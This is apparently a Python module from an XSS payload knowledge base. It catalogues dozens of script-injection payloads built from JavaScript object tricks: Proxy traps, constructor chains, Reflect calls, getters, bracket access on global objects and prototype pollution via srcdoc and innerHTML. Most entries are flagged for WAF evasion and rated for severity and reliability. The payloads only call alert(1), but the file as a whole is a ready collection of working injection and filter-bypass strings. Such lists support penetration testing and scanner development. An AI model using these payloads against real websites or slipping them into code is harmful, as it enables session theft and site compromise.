#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

JavaScript Object Payloads
"""

from ..models import PayloadEntry


PROXY_PAYLOADS = {
    "proxy_1": PayloadEntry(
        payload="<script>new Proxy({},{get:()=>alert(1)}).x</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Proxy get trap",
        tags=["proxy", "trap", "get"],
        waf_evasion=True,
        reliability="high",
    ),
    "proxy_2": PayloadEntry(
        payload="<script>new Proxy(()=>{},{apply:()=>alert(1)})()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Proxy apply trap",
        tags=["proxy", "trap", "apply"],
        waf_evasion=True,
        reliability="high",
    ),
    "proxy_3": PayloadEntry(
        payload="<script>new Proxy(class{},{construct:()=>({valueOf:alert})}).valueOf=1</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Proxy construct trap",
        tags=["proxy", "trap", "construct"],
        waf_evasion=True,
        reliability="medium",
    ),
}

FINALIZATION_PAYLOADS = {
    "final_1": PayloadEntry(
        payload="<script>new FinalizationRegistry(()=>alert(1)).register({},'')</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="FinalizationRegistry callback",
        tags=["finalization", "registry", "modern"],
        waf_evasion=True,
        reliability="low",
    ),
}

INTL_PAYLOADS = {
    "intl_1": PayloadEntry(
        payload="<script>new Intl.DateTimeFormat('en',{timeZone:alert(1)||'UTC'})</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Intl.DateTimeFormat XSS",
        tags=["intl", "DateTimeFormat"],
        waf_evasion=True,
        reliability="medium",
    ),
}

MATH_PAYLOADS = {
    "math_1": PayloadEntry(
        payload="<script>Math.constructor.constructor('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Math constructor chain",
        tags=["math", "constructor"],
        waf_evasion=True,
        reliability="high",
    ),
    "math_2": PayloadEntry(
        payload="<script>Math.__proto__.constructor.constructor('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Math prototype constructor",
        tags=["math", "prototype", "constructor"],
        waf_evasion=True,
        reliability="high",
    ),
}

JSON_PAYLOADS = {
    "json_obj_1": PayloadEntry(
        payload="<script>JSON.constructor.constructor('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="JSON constructor chain",
        tags=["json", "constructor"],
        waf_evasion=True,
        reliability="high",
    ),
    "json_obj_2": PayloadEntry(
        payload="<script>JSON.parse.constructor('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="JSON.parse constructor",
        tags=["json", "parse", "constructor"],
        waf_evasion=True,
        reliability="high",
    ),
}

REGEXP_PAYLOADS = {
    "regexp_1": PayloadEntry(
        payload="<script>/./.__proto__.constructor.constructor('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="RegExp prototype constructor",
        tags=["regexp", "prototype", "constructor"],
        waf_evasion=True,
        reliability="high",
    ),
    "regexp_2": PayloadEntry(
        payload="<script>RegExp.prototype.constructor.constructor('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="RegExp prototype direct",
        tags=["regexp", "prototype", "direct"],
        waf_evasion=True,
        reliability="high",
    ),
}

DATE_PAYLOADS = {
    "date_1": PayloadEntry(
        payload="<script>Date.constructor.constructor('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Date constructor chain",
        tags=["date", "constructor"],
        waf_evasion=True,
        reliability="high",
    ),
    "date_2": PayloadEntry(
        payload="<script>new Date().constructor.constructor('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Date instance constructor",
        tags=["date", "instance", "constructor"],
        waf_evasion=True,
        reliability="high",
    ),
}

WRAPPER_PAYLOADS = {
    "wrapper_1": PayloadEntry(
        payload="<script>(1).constructor.constructor('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Number constructor chain",
        tags=["number", "constructor"],
        waf_evasion=True,
        reliability="high",
    ),
    "wrapper_2": PayloadEntry(
        payload="<script>''.constructor.constructor('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="String constructor chain",
        tags=["string", "constructor"],
        waf_evasion=True,
        reliability="high",
    ),
    "wrapper_3": PayloadEntry(
        payload="<script>true.constructor.constructor('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Boolean constructor chain",
        tags=["boolean", "constructor"],
        waf_evasion=True,
        reliability="high",
    ),
}

PROTOTYPE_METHOD_PAYLOADS = {
    "proto_method_1": PayloadEntry(
        payload="<script>Object.defineProperty({},'x',{get:alert}).x</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="defineProperty getter XSS",
        tags=["defineProperty", "getter"],
        waf_evasion=True,
        reliability="high",
    ),
    "proto_method_2": PayloadEntry(
        payload="<script>Object.assign({},{get x(){return alert(1)}}).x</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Object.assign getter XSS",
        tags=["assign", "getter"],
        waf_evasion=True,
        reliability="high",
    ),
    # === PortSwigger Prototype Pollution to XSS ===
    "ps-proto-pollution-srcdoc": PayloadEntry(
        payload='Object.prototype.srcdoc="<script>alert(1)</script>"',
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Prototype pollution to XSS via srcdoc",
        tags=["portswigger", "prototype-pollution", "srcdoc"],
        reliability="medium",
    ),
    "ps-proto-pollution-innerhtml": PayloadEntry(
        payload='Object.prototype.innerHTML="<img src=x onerror=alert(1)>"',
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Prototype pollution to XSS via innerHTML",
        tags=["portswigger", "prototype-pollution", "innerHTML"],
        reliability="medium",
    ),
}

OBJECT_METHOD_PAYLOADS = {
    "obj_entries": PayloadEntry(
        payload="<script>Object.entries({get x(){return alert(1)}})</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Object.entries with getter",
        tags=["object", "entries", "getter"],
        waf_evasion=True,
        reliability="medium",
    ),
    "obj_values": PayloadEntry(
        payload="<script>Object.values({get x(){return alert(1)}})</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Object.values with getter",
        tags=["object", "values", "getter"],
        waf_evasion=True,
        reliability="medium",
    ),
    "obj_keys": PayloadEntry(
        payload="<script>Object.keys({[alert(1)]:1})</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Object.keys with computed property",
        tags=["object", "keys", "computed"],
        waf_evasion=True,
        reliability="high",
    ),
    "obj_fromEntries": PayloadEntry(
        payload="<script>Object.fromEntries([[alert(1),1]])</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Object.fromEntries with alert key",
        tags=["object", "fromEntries"],
        waf_evasion=True,
        reliability="high",
    ),
}

REFLECT_PAYLOADS = {
    "reflect_apply": PayloadEntry(
        payload="<script>Reflect.apply(alert,null,[1])</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Reflect.apply",
        tags=["reflect", "apply"],
        waf_evasion=True,
        reliability="high",
    ),
    "reflect_construct": PayloadEntry(
        payload="<script>Reflect.construct(Function,['alert(1)'])()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Reflect.construct Function",
        tags=["reflect", "construct"],
        waf_evasion=True,
        reliability="high",
    ),
    "reflect_get": PayloadEntry(
        payload="<script>Reflect.get({get x(){return alert(1)}},'x')</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Reflect.get with getter",
        tags=["reflect", "get", "getter"],
        waf_evasion=True,
        reliability="high",
    ),
    "reflect_set": PayloadEntry(
        payload="<script>Reflect.set({set x(v){alert(1)}},'x',1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Reflect.set with setter",
        tags=["reflect", "set", "setter"],
        waf_evasion=True,
        reliability="high",
    ),
}

GLOBAL_OBJECTS_PAYLOADS = {
    "global_window": PayloadEntry(
        payload="<script>window['alert'](1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="window['alert']",
        tags=["global", "window", "bracket"],
        waf_evasion=True,
        reliability="high",
    ),
    "global_self": PayloadEntry(
        payload="<script>self['alert'](1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="self['alert']",
        tags=["global", "self", "bracket"],
        waf_evasion=True,
        reliability="high",
    ),
    "global_this": PayloadEntry(
        payload="<script>globalThis['alert'](1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="globalThis['alert']",
        tags=["global", "globalThis", "bracket"],
        waf_evasion=True,
        reliability="high",
    ),
    "global_top": PayloadEntry(
        payload="<script>top['alert'](1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="top['alert']",
        tags=["global", "top", "bracket"],
        waf_evasion=True,
        reliability="high",
    ),
    "global_parent": PayloadEntry(
        payload="<script>parent['alert'](1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="parent['alert']",
        tags=["global", "parent", "bracket"],
        waf_evasion=True,
        reliability="high",
    ),
    "global_frames": PayloadEntry(
        payload="<script>frames['alert'](1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="frames['alert']",
        tags=["global", "frames", "bracket"],
        waf_evasion=True,
        reliability="high",
    ),
}

# Combined database
JS_OBJECTS_DATABASE = {
    **PROXY_PAYLOADS,
    **FINALIZATION_PAYLOADS,
    **INTL_PAYLOADS,
    **MATH_PAYLOADS,
    **JSON_PAYLOADS,
    **REGEXP_PAYLOADS,
    **DATE_PAYLOADS,
    **WRAPPER_PAYLOADS,
    **PROTOTYPE_METHOD_PAYLOADS,
    **OBJECT_METHOD_PAYLOADS,
    **REFLECT_PAYLOADS,
    **GLOBAL_OBJECTS_PAYLOADS,
}
JS_OBJECTS_TOTAL = len(JS_OBJECTS_DATABASE)
